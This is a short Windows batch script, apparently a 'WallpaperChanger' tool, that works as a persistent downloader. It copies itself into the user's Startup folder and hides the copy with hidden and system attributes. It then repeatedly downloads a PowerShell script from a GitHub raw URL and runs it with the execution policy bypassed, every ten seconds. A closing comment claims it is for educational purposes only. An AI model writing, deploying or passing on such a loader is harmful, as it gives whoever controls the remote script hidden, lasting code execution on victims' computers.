@echo off
setlocal enabledelayedexpansion

set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/set.ps1
set scriptPath1=%userprofile%\AppData\Local\Temp\set.ps1
::set scriptPath2=%userprofile%\Documents\set.ps1
set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\set.ps1
set batchPath=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat

if not exist "%batchPath%" (
    copy "%~f0" "%batchPath%"
    attrib +h +s "%batchPath%"
)

:checkloop

echo Checking for the existence of %scriptPath1%...
if not exist "%scriptPath1%" (
    echo Downloading script from %scriptURL%...

    curl -o "%scriptPath1%" "%scriptURL%"
    if %errorlevel% neq 0 (
        echo curl download failed, switching to Invoke-WebRequest.
        powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%'"
    )

    if not exist "%scriptPath1%" (
        echo Failed to download %scriptPath1%. Exiting.
        pause
        exit /b 1
    ) else (
        echo Download succeeded.
    )
)

echo Executing the PowerShell script...
powershell -ExecutionPolicy Bypass -File "%scriptPath1%"

timeout /t 10 >nul
goto checkloop

:: Educational purposes only!
